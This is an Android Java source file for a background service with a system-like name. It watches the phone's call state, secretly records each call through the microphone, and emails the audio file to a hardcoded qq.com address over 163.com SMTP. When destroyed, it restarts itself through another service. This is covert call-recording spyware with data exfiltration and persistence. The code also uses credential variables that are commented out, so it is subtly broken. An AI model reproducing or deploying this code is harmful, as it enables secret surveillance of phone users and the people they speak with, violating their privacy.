package com.aa.aaa;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import java.io.File;

public class SystemService2 extends Service {
    public SystemService2() {
    }

    //电话管理器
    private TelephonyManager tm;
    //监听对象
    private MyListener listener;
    //声明录音机
    private MediaRecorder mediaRecorder;

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        return null;
    }

    //创建服务的时候调用的方法
    public void onCreate() {
        //后台监听电话的呼叫状态
        //得到电话管理器
        tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
        listener = new MyListener();
        tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
        super.onCreate();
    }

    private class MyListener extends PhoneStateListener {
        //当电话的呼叫状态发生变化的时候调用的方法
        private String filePath = "";

        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            super.onCallStateChanged(state, incomingNumber);
            try {
                switch (state) {
                    case TelephonyManager.CALL_STATE_IDLE://空间状态
                        if (mediaRecorder != null) {
                            //8.停止捕获
                            mediaRecorder.stop();
                            //9.释放资源
                            mediaRecorder.release();
                            mediaRecorder = null;
                            System.out.println("录制完毕，上传到服务器分析");

                            sendMail(filePath);

                        }
                        break;
                    case TelephonyManager.CALL_STATE_RINGING://通话状态
                        break;
                    case TelephonyManager.CALL_STATE_OFFHOOK://通话状态
                        //开始录音
                        //实例化一个录音机
                        mediaRecorder = new MediaRecorder();
                        //2.指定录音机的声音源
                        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        //3.设置录制的文件输出的格式
                        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
                        //4.制定录音文件的名称
                        File file = new File(Environment.getExternalStorageDirectory(), System.currentTimeMillis() + ".3gp");
                        filePath = file.getAbsolutePath();
                        mediaRecorder.setOutputFile(filePath);
                        //5.设置音频的编码
                        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
                        //6.开始准备录音
                        mediaRecorder.prepare();
                        //7.开始录音
                        mediaRecorder.start();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    //服务器销毁的时候调用的方法

    @Override
    public void onDestroy() {
        super.onDestroy();
        //取消电话的监听
        System.out.println("onDestroy");
        Intent intent = new Intent(this,SystemService.class);
        startService(intent);
        tm.listen(listener, PhoneStateListener.LISTEN_NONE);
        listener = null;
        
    }


    public void sendMail(final String path){
        new Thread(new Runnable() {
            public void run() {
                EmailUtil emailUtil = new EmailUtil();
                try {
					//发送者邮箱，请自己申请
                    //String account = "xxxxxxxxxxxx@qq.com";
                    //String password = "xxxxxxxxx";
					//接收者邮箱
                    emailUtil.sendMail("26012450@qq.com", account, "smtp.163.com",
                            account, password, "电话录音", "邮件由系统自动发送，请不要回复！", path);

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}


    
